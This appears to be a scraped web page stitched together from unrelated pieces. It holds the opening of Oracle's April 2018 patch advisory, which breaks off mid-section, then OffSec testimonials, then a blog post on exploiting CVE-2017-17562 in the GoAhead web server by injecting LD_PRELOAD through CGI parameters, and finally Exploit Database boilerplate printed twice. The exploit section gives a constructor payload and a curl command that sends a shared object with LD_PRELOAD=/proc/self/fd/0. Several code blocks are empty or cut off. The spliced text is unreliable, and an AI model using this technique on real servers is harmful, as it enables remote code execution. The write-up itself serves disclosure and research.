# Oracle Critical Patch Update Advisory - April 2018

## Oracle Critical Patch Update Advisory - April 2018

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to:

* [Critical Patch Updates, Security Alerts and Bulletins](/security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes without delay.**

This Critical Patch Update contains 255 new security fixes across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [April 2018 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2383583.1).

The January 2018 Critical Patch Update provided patches in response to the Spectre (CVE-2017-5753, CVE-2017-5715) and Meltdown (CVE-2017-5754) processor vulnerabilities. Please refer to this Advisory and the Addendum to the January 2018 Critical Patch Update Advisory for Spectre and Meltdown MOS note ([Doc ID 2347948.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2347948.1)) for information on how to obtain these patches.

#### Note:

* Vulnerabilities affecting Oracle Database and Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2160904.1) for information on minimum revisions of security fixes required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Users running Java SE with a browser can download the latest release from [http://java.com](//www.java.com/en/). Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in [previous Critical Patch Update advisories](/security-alerts/). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpuapr2018verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](http://cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.0 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.0).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update fixes as soon as possible**. Until you apply the Critical Patch Update fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](/support/lifetime-support/). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1). Please review the [Technical Support Policies](/support/policies.html) for further guidelines regarding support policies and phases of support.

### Oracle E-Business Suite Risk Matrix

This Critical Patch Update contains 12 new security fixes for the Oracle E-Business Suite.  11 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here](/security-alerts/cpuapr2018verbose.html#EBS).

Oracle E-Business Suite products include Oracle Database and Oracle Fusion Middleware components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle E-Business Suite products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security fixes are not listed in the Oracle E-Business Suite risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle E-Business Suite products, Oracle recommends that customers apply the April 2018 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Oracle E-Business Suite. For information on what patches need to be applied to your environments, refer to Oracle E-Business Suite Release 12 Critical Patch Update Knowledge Document (April 2018), [My Oracle Support Note 2369524.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2369524.1).

### Oracle Enterprise Manager Products Suite Risk Matrix

This Critical Patch Update contains 10 new security fixes for the Oracle Enterprise Manager Products Suite.  8 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  None of these fixes are applicable to client-only installations, i.e., installations that do not have the Oracle Enterprise Manager Products Suite installed. The English text form of this Risk Matrix can be found [here](/security-alerts/cpuapr2018verbose.html#EM).

Oracle Enterprise Manager products include Oracle Database and Oracle Fusion Middleware components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle Enterprise Manager products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security fixes are not listed in the Oracle Enterprise Manager risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle Enterprise Manager products, Oracle recommends that customers apply the April 2018 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Enterprise Manager. For information on what patches need to be applied to your environments, refer to Critical Patch Update April 2018 Patch Availability Document for Oracle Products, [My Oracle Support Note 2353306.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2353306.1).

### Oracle Fusion Middleware Risk Matrix

This Critical Patch Update contains 40 new security fixes for Oracle Fusion Middleware.  31 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here](/security-alerts/cpuapr2018verbose.html#FMW).

Oracle Fusion Middleware products include Oracle Database components that are affected by the vulnerabilities listed in the Oracle Database section. The exposure of Oracle Fusion Middleware products is dependent on the Oracle Database version being used. Oracle Database security fixes are not listed in the Oracle Fusion Middleware risk matrix. However, since vulnerabilities affecting Oracle Database versions may affect Oracle Fusion Middleware products, Oracle recommends that customers apply the April 2018 Critical Patch Update to the Oracle Database components of Oracle Fusion Middleware products. For information on what patches need to be applied to your environments, refer to Critical Patch Update April 2018 Patch Availability Document for Oracle Products, [My Oracle Support Note 2353306.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2353306.1).

### Oracle Java SE Risk Matrix

This Critical Patch Update contains 14 new security fixes for Oracle Java SE.  12 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here](/security-alerts/cpuapr2018verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Low" instead of "High", lowering the CVSS Base Score. For example, a Base Score of 9.6 becomes 7.1.

Users should only use the default Java Plug-in and Java Web Start from the latest JDK or JRE 8 releases.

     ![Duane LaFlotte](/_astro/duane.CAyBZp_-.png)
### Duane LaFlotte

CTO, Pulsar Security

  I feel like every person's first experience in cybersecurity should be OffSec. Before you go out to figure out how to create a zero-day and you get confused, if you start with OffSec, that won't happen due to how methodologically all the training is put together.      ![Emile Kok](/_astro/emile.C3f2EqfQ.png)

Founder and Managing Director, TSTC Institute

  When going to the real world, you have to know what you're doing and understand what is expected from you on the job. For us, OffSec is the champion in this league in educating and preparing learners.      ![Douglas Costa](/_astro/douglas.BdxOPM2d.png)

# Remote LD\_PRELOAD Exploitation

GoAhead: Make My Day

dan
•December 18, 2017

# Introduction

This blog post details [CVE-2017-17562](https://nvd.nist.gov/vuln/detail/CVE-2017-17562), a vulnerability which can be exploited to gain reliable remote code execution in all versions of the GoAhead web server < 3.6.5.

The vulnerability is a result of Initialising the environment of forked CGI scripts using untrusted HTTP request parameters, and will affect all user’s who have CGI support enabled with dynamically linked executables (CGI scripts). This behavior, when combined with the glibc dynamic linker, can be abused for remote code execution using special variables such as `LD_PRELOAD` (commonly used to perform function hooking, see [preeny](https://github.com/zardus/preeny)).

For those unfamiliar with GoAhead, its [marketing page](https://embedthis.com/goahead/) says that it’s “the world’s most popular, tiny embedded web server” and is used by such companies as IBM, HP, Oracle, Boeing, D-link, and Motorola. We did a search on [shodan](https://www.shodan.io/search?query=Server%3A+GoAhead) **[1]**, and found over 735,000 devices using it on the internet today.

Figure-1: Shodan search results

![Shodan Search Results](/assets/images/blog/2017-12-18-goahead/shodan.png)

**[1] Update 28/12:** *It’s important to note that this number only reflects which set of servers responded to Shodan requests with a “Server: GoAhead” header. This does not reflect the actual subset of devices affected by this issue - which is limited to servers running \*nix, have CGI enabled, and are compiled using dynamically linked executables.*

The exploitation of this issue serves as an interesting case study, and could be applied to other types of software with the same insecure construct.

# Vulnerability Analysis

This vulnerability has existed in all versions of the GoAhead source since at least 2.5.0 (we could not find earlier versions to test against) with the optional CGI support enabled. You can follow along by cloning and compiling the repository as follows:

```

## Code

The vulnerability resides in the `cgiHandler` function, which starts by allocating an array of pointers for the [`envp` argument](https://www.gnu.org/software/libc/manual/html_node/Program-Arguments.html) of the new process, followed by initialising it with the key-value pairs taken from HTTP request parameters. Finally, the `launchCgi` function is called which `fork`’s and `execve`’s the CGI script.

Besides filtering `REMOTE_HOST` and `HTTP_AUTHORIZATION`, all other parameters are considered trusted and passed along unfiltered. This allows an attacker control over arbitrary environment variables for the new CGI process. This is quite dangerous, as you will see later in the exploitation section.

Figure-3: [goahead/src/cgi.c:cgihandler](https://github.com/embedthis/goahead/blob/f9ea55ace3143259095e70c2e05140b1daadadbe/src/cgi.c#L51)

## Patch

This issue was fixed by skipping special parameter names, and prefixing all others with a static string. This appears to remediate the issue even against parameters of the form `a=b%00LD_PRELOAD%3D` - but please let me know if you find otherwise, I’d love to hear about it!

# Exploitation

Although the ability to inject arbitrary environment variables into a new process may seem relatively benign, there are cases where “special” environment variables can lead to alternative control flows for the dynamic linker.

## ELF dynamic linker

Reading the ELF header of the `goahead` binary, we can see that it’s a 64-bit dynamically-linked executable. The program interpreter is specified in the `INTERP` section and points to `/lib64/ld-linux-x86-64.so.2` (this is the dynamic linker).

The dynamic linker is the first code which runs in a dynamically linked executable, and is responsible for linking and loading shared objects and resolving symbols. To get a list of all the shared objects the `goahead` binary loads, we can set a special environment variable `LD_TRACE_LOADED_OBJECTS` to `1`, which prints the loaded libraries and then exits.

Figure-6: ld.so LD\_TRACE\_LOADED\_OBJECTS

```
daniel@makemyday:~/goahead/build/linux-x64-default/bin$ LD_TRACE_LOADED_OBJECTS=1 ./goahead
        linux-vdso.so.1 =>  (0x00007fff31bb4000)
        libgo.so => /home/daniel/goahead/build/linux-x64-default/bin/libgo.so (0x00007f571f548000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f571f168000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f571ef49000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f571f806000)
daniel@makemyday:~/goahead/build/linux-x64-default/bin$
```

We can also find this information statically (without running the dynamic linker), by grepping for `DT_NEEDED` entries defined in each of the ELF shared objects recursively:

```

**Note:** For the astute reader who noticed these binaries are missing `linux-vdso.so.1`, that’s correct! vDSO is a special shared library mapped into user-space processes by the kernel. See [man 7 vdso](http://man7.org/linux/man-pages/man7/vdso.7.html).

## Special Environment Variables

So that’s good and all, but what does any of this have to do with injecting environment variables? Well … we know the dynamic linker is the first code to execute for a new process - and if we read [man 8 ld.so](http://man7.org/linux/man-pages/man8/ld.so.8.html) we discover there are special environment variables which modify default behavior.

As I’m a fan of looking at the source, let us take a journey into what’s happening. The `dl_main` function is essentially the main entry point of the dynamic linker.

Figure-8: [glibc/elf/rtld.c:dl\_main](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/rtld.c;h=cfd3729b8e7120d7f48c851deae7b6563a8df95e;hb=HEAD#l865)

```
static void
dl_main (const ElfW(Phdr) *phdr,
         ElfW(Word) phnum,
         ElfW(Addr) *user_entry,
         ElfW(auxv_t) *auxv)
{
  const ElfW(Phdr) *ph;
  enum mode mode;
  struct link_map *main_map;
  size_t file_size;
  char *file;
  bool has_interp = false;
  unsigned int i;

...

  /* Process the environment variable which control the behaviour.  */
  process_envvars (&mode);
```

One of the first things this function does is call `process_envvars`.

Figure-9: [glibc/elf/rtld.c:process\_envvars](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/rtld.c;h=cfd3729b8e7120d7f48c851deae7b6563a8df95e;hb=HEAD#l2457)

```
static void
process_envvars (enum mode *modep)
{
  char **runp = _environ;
  char *envline;
  enum mode mode = normal;
  char *debug_output = NULL;

  /* This is the default place for profiling data file.  */
  GLRO(dl_profile_output)
    = &"/var/tmp\0/var/profile"[__libc_enable_secure ? 9 : 0];

  while ((envline = _dl_next_ld_env_entry (&runp)) != NULL)
    {
      size_t len = 0;

      while (envline[len] != '\0' && envline[len] != '=')
        ++len;

      if (envline[len] != '=')
        /* This is a "LD_" variable at the end of the string without
           a '=' character.  Ignore it since otherwise we will access
           invalid memory below.  */
        continue;

      switch (len)
        {
        case 4:
          /* Warning level, verbose or not.  */
          if (memcmp (envline, "WARN", 4) == 0)
            GLRO(dl_verbose) = envline[5] != '\0';
          break;

        case 5:
          /* Debugging of the dynamic linker?  */
          if (memcmp (envline, "DEBUG", 5) == 0)
            {
              process_dl_debug (&envline[6]);
              break;
            }
          if (memcmp (envline, "AUDIT", 5) == 0)
            audit_list_string = &envline[6];
          break;

        case 7:
          /* Print information about versions.  */
          if (memcmp (envline, "VERBOSE", 7) == 0)
            {
              version_info = envline[8] != '\0';
              break;
            }

          /* List of objects to be preloaded.  */
          if (memcmp (envline, "PRELOAD", 7) == 0)
            {
              preloadlist = &envline[8];
              break;
            }
```

We see that the linker is parsing the `envp` array and exercising different code paths if special variable names are found. What is particularly interesting is `case 7`’s processing of `LD_PRELOAD`, where `preloadlist` is initialised.

Figure-10: [glibc/elf/rtld.c:dl\_main](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/rtld.c;h=cfd3729b8e7120d7f48c851deae7b6563a8df95e;hb=HEAD#l1606)

```
...
  /* We have two ways to specify objects to preload: via environment
     variable and via the file /etc/ld.so.preload.  The latter can also
     be used when security is enabled.  */
  assert (*first_preload == NULL);
  struct link_map **preloads = NULL;
  unsigned int npreloads = 0;

  if (__glibc_unlikely (preloadlist != NULL))
    {
      HP_TIMING_NOW (start);
      npreloads += handle_ld_preload (preloadlist, main_map);
      HP_TIMING_NOW (stop);
      HP_TIMING_DIFF (diff, start, stop);
      HP_TIMING_ACCUM_NT (load_time, diff);
    }
...
```

Further down in `dl_main`, if `preloadlist` is not `NULL` then the `handle_ld_preload` function is called.

Figure-11: [glibc/elf/rtld.c:handle\_ld\_preload](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/rtld.c;h=cfd3729b8e7120d7f48c851deae7b6563a8df95e;hb=HEAD#l829)

```
/* The list preloaded objects.  */
static const char *preloadlist attribute_relro;
/* Nonzero if information about versions has to be printed.  */
static int version_info attribute_relro;

/* The LD_PRELOAD environment variable gives list of libraries
   separated by white space or colons that are loaded before the
   executable's dependencies and prepended to the global scope list.
   (If the binary is running setuid all elements containing a '/' are
   ignored since it is insecure.)  Return the number of preloads
   performed.  */
unsigned int
handle_ld_preload (const char *preloadlist, struct link_map *main_map)
{
  unsigned int npreloads = 0;
  const char *p = preloadlist;
  char fname[SECURE_PATH_LIMIT];

  while (*p != '\0')
    {
      /* Split preload list at space/colon.  */
      size_t len = strcspn (p, " :");
      if (len > 0 && len < sizeof (fname))
        {
          memcpy (fname, p, len);
          fname[len] = '\0';
        }
      else
        fname[0] = '\0';

      /* Skip over the substring and the following delimiter.  */
      p += len;
      if (*p != '\0')
        ++p;

      if (dso_name_valid_for_suid (fname))
        npreloads += do_preload (fname, main_map, "LD_PRELOAD");
    }
  return npreloads;
}
...
```

The `handle_ld_preload` function will parse the `preloadlist` and treat its value as a list of shared objects to be loaded!

If we put all this together; with `goahead` enabling us to inject arbitrary environment variables, we can abuse the fact that glibc handles special cases such as `LD_PRELOAD` differently to load arbitrary shared objects that aren’t even listed in the binary!

## ELF .so

So, that’s cool and all - we can force arbitrary shared objects to be loaded. But how does this allow us to run code?

Enter the [`.init` and `.fini` sections](http://l4u-00.jinr.ru/usoft/WWW/www_debian.org/Documentation/elf/node3.html). If we wrap a function with a [constructor attribute](https://gcc.gnu.org/onlinedocs/gcc/Common-Function-Attributes.html) then we can force that function to be called even before `main`.

Figure-12: PoC/payload.c

```
#include <unistd.h>

static void before_main(void) __attribute__((constructor));

static void before_main(void)
{
    write(1, "Hello: World!\n", 14);
}
```

Figure-13: Compiling payload.c as shared object.

```
daniel@makemyday:~/goahead/PoC$ gcc -shared -fPIC ./payload.c -o payload.so
daniel@makemyday:~/goahead/PoC$ LD_PRELOAD=./payload.so cat /dev/null
Hello: World!
daniel@makemyday:~/goahead/PoC$
```

Sweet! What does this look like if we try this out against GoAhead on our test system?

Figure-14: Trying a simple PoC

```
daniel@makemyday:~/goahead/PoC$ ls -la ./payload.so
-rwxrwxr-x 1 daniel daniel 7896 Dec 13 17:38 ./payload.so
daniel@makemyday:~/goahead/PoC$ echo -en "GET /cgi-bin/cgitest?LD_PRELOAD=$(pwd)/payload.so HTTP/1.0\r\n\r\n" | nc localhost 80 | head -10

```

We can clearly see that our shared objects code was executed by the `cgitest` process via `LD_PRELOAD`.

## Linux /proc/self/fd/0

There is still one critical piece of the puzzle that we are missing. Even though we know it’s possible to load arbitrary shared objects from disk, and constructors will allow for code execution - how do we actually inject a malicious shared object into the remote server? After all, if we can’t do that then it’s really unlikely a legitimate shared object on disk will help us.

Fortunately, the `launchCgi` method will actually [dup2()](http://man7.org/linux/man-pages/man2/dup.2.html) the stdin file descriptor which points to a temporary file containing the request body of the `POST` request. This means that there will be a file on disk containing user-supplied data and could be referenced with something like `LD_PRELOAD=/tmp/cgi-XXXXXX`.

Figure-15: [goahead/src/cgi.c:launchCgi](https://github.com/embedthis/goahead/blob/f9ea55ace3143259095e70c2e05140b1daadadbe/src/cgi.c#L533)

```
/*
    Launch the CGI process and return a handle to it.
 */
static CgiPid launchCgi(char *cgiPath, char **argp, char **envp, char *stdIn, char *stdOut)
{
    int     fdin, fdout, pid;

    trace(5, "cgi: run %s", cgiPath);

    if ((fdin = open(stdIn, O_RDWR | O_CREAT | O_BINARY, 0666)) < 0) {
        error("Cannot open CGI stdin: ", cgiPath);
        return -1;
    }
    if ((fdout = open(stdOut, O_RDWR | O_CREAT | O_TRUNC | O_BINARY, 0666)) < 0) {
        error("Cannot open CGI stdout: ", cgiPath);
        return -1;
    }

    pid = vfork();
    if (pid == 0) {
        /*
            Child
         */
        if (dup2(fdin, 0) < 0) {
            printf("content-type: text/html\n\nDup of stdin failed\n");
            _exit(1);

        } else if (dup2(fdout, 1) < 0) {
            printf("content-type: text/html\n\nDup of stdout failed\n");
            _exit(1);

        } else if (execve(cgiPath, argp, envp) == -1) {
            printf("content-type: text/html\n\nExecution of cgi process failed\n");
        }
    ...
}
```

Still, this is kind of annoying (but not impossible) having to remotely guess the temporary filename containing our `POST` payload. Fortunately, the Linux `procfs` filesystem has a nice symbolic link that we can use to reference the stdin descriptor, which points to our temporary file. This can leveraged by pointing `LD_PRELOAD` to `/proc/self/fd/0`. This can also be accessed using `/dev/stdin`.

Figure-16: [linux/fs/proc/self.c](https://elixir.free-electrons.com/linux/latest/source/fs/proc/self.c)

```
static const char *proc_self_get_link(struct dentry *dentry,
				      struct inode *inode,
				      struct delayed_call *done)
{
	struct pid_namespace *ns = inode->i_sb->s_fs_info;
	pid_t tgid = task_tgid_nr_ns(current, ns);
	char *name;

	if (!tgid)
		return ERR_PTR(-ENOENT);
	/* 11 for max length of signed int in decimal + NULL term */
	name = kmalloc(12, dentry ? GFP_KERNEL : GFP_ATOMIC);
	if (unlikely(!name))
		return dentry ? ERR_PTR(-ENOMEM) : ERR_PTR(-ECHILD);
	sprintf(name, "%d", tgid);
	set_delayed_call(done, kfree_link, name);
	return name;
}

static const struct inode_operations proc_self_inode_operations = {
	.get_link	= proc_self_get_link,
};

```

If we put all this information together, we can reliably exploit the vulnerability by sending a `POST` request containing a malcious shared object which contains a `constructor` to be called when loaded. We also specify an HTTP parameter containing `?LD_PRELOAD=/proc/self/fd/0` which will point to the temporary file on disk containing the attackers payload. At this point it’s game over.

Figure-17: exploiting via the command line

```
daniel@makemyday:~/goahead/PoC$ curl -X POST --data-binary @payload.so http://makemyday/cgi-bin/cgitest?LD_PRELOAD=/proc/self/fd/0 -i | head

# Conclusion

This vulnerability was an interesting case study in how to remotely exploit `LD_PRELOAD`, and was tested (and worked) against all versions of the GoAhead web server that we compiled with CGI support enabled. The construct itself may exist in other services, and it would be interesting to investigate. It may be possible to just use the exploit string and do this blind without actually auditing any code.

Although the CGI handling code remained relatively stable in all versions of the web server (which made it the ideal target), there has been a significant amount of code churn over the years in other modules. It’s possible there are other interesting vulnerabilities - and for those interested I’d recommend starting with a grep for `websDefineHandler` entry points.

If you’re interested in learning more about linking and loading, there’s a great article [here](https://www.cs.stevens.edu/~jschauma/810/elf.html) and [here](http://s.eresi-project.org/inc/articles/elf-rtld.txt) that we suggest you check out.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
